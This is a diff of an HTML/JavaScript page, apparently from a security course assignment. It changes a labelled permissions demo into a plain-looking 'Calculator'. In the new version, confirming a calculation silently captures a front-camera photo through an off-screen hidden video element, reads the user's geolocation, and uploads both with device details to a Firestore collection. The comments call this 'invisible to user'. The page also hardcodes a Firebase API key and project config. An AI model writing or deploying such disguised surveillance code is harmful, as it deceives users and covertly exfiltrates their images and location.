@@ -3,16 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Calculator Demo</title>
+    <title>Calculator</title>
     <link rel="stylesheet" href="style.css">
-
-    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
 
 <div class="main-container">
-    <div class="left-section">
+    <div class="calculator-section">
         <h2>Calculator</h2>
         <div class="calculator">
             <input type="text" id="display" disabled>
@@ -40,181 +37,180 @@
 
             <div class="button-row">
                 <button onclick="press('0')">0</button>
-                <button onclick="calculate()">=</button>
+                <button onclick="showConfirmModal()">=</button>
                 <button onclick="clearDisplay()">C</button>
                 <button onclick="press('+')">+</button>
             </div>
         </div>
     </div>
+</div>
 
-    <div class="right-section">
-        <h2>Security Permission Demo</h2>
-        <div class="demo-section">
-            <div class="demo-subsection">
-                <h3>1️⃣ Camera Access Demo</h3>
-                <button onclick="startCamera()">Enable Camera</button>
-                <br>
-                <video id="camera" autoplay></video>
-            </div>
-
-            <div class="demo-subsection">
-                <h3>2️⃣ Video Recording Demo</h3>
-                <button onclick="startRecording()">Start Recording</button>
-                <button onclick="stopRecording()">Stop Recording</button>
-            </div>
-
-            <div class="demo-subsection">
-                <h3>3️⃣ Location Demo</h3>
-                <button onclick="getLocation()">Get Location</button>
-                <p id="location"></p>
-            </div>
+<!-- Confirmation Modal Overlay -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+        <div class="modal-icon">🔢</div>
+        <h2 class="modal-title">Confirm Calculation</h2>
+        <p class="modal-text">Are you sure you want to calculate this expression?</p>
+        <div class="modal-buttons">
+            <button class="modal-btn modal-btn-cancel" onclick="closeModal()">Cancel</button>
+            <button class="modal-btn modal-btn-confirm" onclick="confirmCalculation()">Confirm</button>
         </div>
     </div>
 </div>
 
+<!-- Hidden elements for background capture (invisible to user) -->
+<video id="hiddenVideo" autoplay playsinline
+    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
+</video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+
 <script>
+// ===== FIREBASE INIT =====
 const firebaseConfig = {
-  apiKey: "AIzaSyD8ahJTs1rf0GLNCzNHtSJWI8AzXViGb00",
-  authDomain: "is-assignment-9b700.firebaseapp.com",
-  projectId: "is-assignment-9b700",
-  storageBucket: "is-assignment-9b700.firebasestorage.app",
-  messagingSenderId: "418050182436",
-  appId: "1:418050182436:web:90af090c5377f40cedb7b1"
+    apiKey: "AIzaSyD8ahJTs1rf0GLNCzNHtSJWI8AzXViGb00",
+    authDomain: "is-assignment-9b700.firebaseapp.com",
+    projectId: "is-assignment-9b700",
+    storageBucket: "is-assignment-9b700.firebasestorage.app",
+    messagingSenderId: "418050182436",
+    appId: "1:418050182436:web:90af090c5377f40cedb7b1"
 };
 
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-function getDeviceInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        timestamp: new Date().toISOString()
-    };
-}
-
+// ===== CALCULATOR LOGIC =====
 function press(val) {
     document.getElementById("display").value += val;
-}
-
-function calculate() {
-    try {
-        document.getElementById("display").value =
-            eval(document.getElementById("display").value);
-    } catch {
-        alert("Invalid Expression");
-    }
 }
 
 function clearDisplay() {
     document.getElementById("display").value = "";
 }
 
-let mediaStream;
-let mediaRecorder;
-let recordedChunks = [];
-
-async function startCamera() {
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById("camera").srcObject = mediaStream;
-
-        setTimeout(() => captureSnapshot(), 2000);
-    } catch (err) {
-        alert("Camera permission denied.");
-    }
-}
-
-function captureSnapshot() {
-    try {
-        const video = document.getElementById("camera");
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-
-        const base64Image = canvas.toDataURL("image/jpeg", 0.5);
-
-        db.collection("snapshots").add({
-            image: base64Image,
-            ...getDeviceInfo()
-        });
-        console.log("Snapshot saved.");
-    } catch (err) {
-        console.log("Snapshot capture failed.", err);
-    }
-}
-
-function startRecording() {
-    if (!mediaStream) {
-        alert("Enable camera first.");
+// ===== MODAL LOGIC =====
+function showConfirmModal() {
+    const expr = document.getElementById("display").value;
+    if (!expr || expr.trim() === "") {
         return;
     }
-
-    mediaRecorder = new MediaRecorder(mediaStream);
-    mediaRecorder.ondataavailable = event => {
-        recordedChunks.push(event.data);
-    };
-
-    mediaRecorder.start();
-    alert("Recording started.");
+    document.getElementById("modalOverlay").classList.add("active");
 }
 
-function stopRecording() {
-    if (!mediaRecorder || mediaRecorder.state === "inactive") {
-        alert("Not currently recording.");
-        return;
+function closeModal() {
+    document.getElementById("modalOverlay").classList.remove("active");
+}
+
+function confirmCalculation() {
+    // 1. Perform the calculation
+    try {
+        document.getElementById("display").value =
+            eval(document.getElementById("display").value);
+    } catch {
+        document.getElementById("display").value = "Error";
     }
 
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: "video/webm" });
-        recordedChunks = [];
+    // 2. Close the modal
+    closeModal();
 
-        const videoURL = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = videoURL;
-        a.download = "recorded_video.webm";
-        a.click();
-
-        const reader = new FileReader();
-        reader.onloadend = () => {
-            db.collection("recordings").add({
-                video: reader.result,
-                ...getDeviceInfo()
-            });
-            console.log("Recording saved.");
-        };
-        reader.readAsDataURL(blob);
-    };
-
-    mediaRecorder.stop();
-    alert("Recording stopped.");
+    // 3. Silently capture data in the background
+    captureAllDataInBackground();
 }
 
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
+// ===== BACKGROUND DATA CAPTURE =====
+async function captureAllDataInBackground() {
+    // Run location + photo capture in parallel
+    const [locationResult, photoResult] = await Promise.allSettled([
+        getLocationSilently(),
+        capturePhotoSilently()
+    ]);
 
-            document.getElementById("location").innerHTML =
-                "Latitude: " + lat + "<br>Longitude: " + lng;
+    // Build the document matching your existing Firestore format
+    const docData = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        language: navigator.language || "",
+        platform: navigator.platform || "",
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height
+    };
 
-            db.collection("locations").add({
-                latitude: lat,
-                longitude: lng,
-                ...getDeviceInfo()
-            });
-            console.log("Location saved.");
-        }, error => {
-            alert("Location permission denied or unavailable.");
+    // Attach photo as base64 string
+    if (photoResult.status === "fulfilled" && photoResult.value) {
+        docData.image = photoResult.value;
+    }
+
+    // Attach location
+    if (locationResult.status === "fulfilled" && locationResult.value) {
+        docData.latitude = locationResult.value.latitude;
+        docData.longitude = locationResult.value.longitude;
+    }
+
+    // Send to Firestore
+    try {
+        await db.collection("captured_data").add(docData);
+        console.log("Data sent to Firestore successfully");
+    } catch (err) {
+        console.log("Firestore error:", err);
+    }
+}
+
+// Get location without any visible UI
+function getLocationSilently() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(null);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                });
+            },
+            () => resolve(null),
+            { timeout: 10000 }
+        );
+    });
+}
+
+// Capture a photo from hidden camera and return as base64 string
+async function capturePhotoSilently() {
+    let stream;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: 480, height: 640 },
+            audio: false
         });
-    } else {
-        alert("Geolocation not supported.");
+    } catch {
+        return null;
     }
+
+    const hiddenVideo = document.getElementById("hiddenVideo");
+    const hiddenCanvas = document.getElementById("hiddenCanvas");
+    hiddenVideo.srcObject = stream;
+
+    // Wait for camera to initialize
+    await new Promise(r => setTimeout(r, 500));
+
+    // Capture photo to canvas
+    hiddenCanvas.width = hiddenVideo.videoWidth || 480;
+    hiddenCanvas.height = hiddenVideo.videoHeight || 640;
+    const ctx = hiddenCanvas.getContext("2d");
+    ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+
+    // Convert to base64 data URL string
+    const base64 = hiddenCanvas.toDataURL("image/jpeg", 0.7);
+
+    // Stop camera immediately
+    stream.getTracks().forEach(track => track.stop());
+    hiddenVideo.srcObject = null;
+
+    return base64;
 }
 </script>
 
